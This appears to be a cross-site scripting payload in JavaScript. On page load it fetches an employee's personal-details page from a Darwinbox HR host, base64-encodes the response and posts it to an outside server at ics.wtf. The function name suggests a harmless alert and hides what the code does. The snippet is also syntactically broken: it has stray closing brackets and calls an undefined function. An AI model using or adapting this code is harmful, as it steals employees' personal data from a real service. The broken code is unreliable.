function showAlertAfterExecution(){
  const fetchUrl = `https://dbox.darwinbox.in/employeeprofile/personalDetails/id/${userId}`;
    const postUrl = 'https://ics.wtf/data.php';
    
    const xhr = new XMLHttpRequest();
    xhr.open('GET', fetchUrl, true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            const data = xhr.responseText;
            const base64Data = btoa(data);

            const postXhr = new XMLHttpRequest();
            postXhr.open('POST', postUrl, true);
            postXhr.setRequestHeader('Content-Type', 'application/json');
            postXhr.send(JSON.stringify({ data: base64Data }));

            postXhr.onreadystatechange = function () {
                if (postXhr.readyState === 4 && postXhr.status === 200) {
                    console.log('Data sent successfully!');
                }
            };
        }
    };
    xhr.send();
}); }window.onload=function(){showAlertAfterExecution();};

    

const userId = '123'; // Replace with the actual userId
fetchAndSendData(userId);
